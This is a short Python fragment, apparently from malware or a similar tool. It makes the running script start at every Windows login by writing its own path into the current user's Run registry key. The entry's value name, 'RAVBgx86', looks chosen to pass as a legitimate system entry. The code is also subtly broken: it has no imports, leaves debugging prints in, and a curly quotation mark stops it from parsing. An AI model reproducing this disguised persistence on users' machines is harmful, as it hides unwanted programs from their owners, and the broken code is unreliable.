def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    print(fp)
    file_name=sys.argv[0].split("\\")[-1]
    print(file_name)
    new_file_path=fp+"\\"+file_name
    print(new_file_path)
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)
    print(key2change,keyVal)

    SetValueEx(key2change, “RAVBgx86",0,REG_SZ, new_file_path)
addStartup()
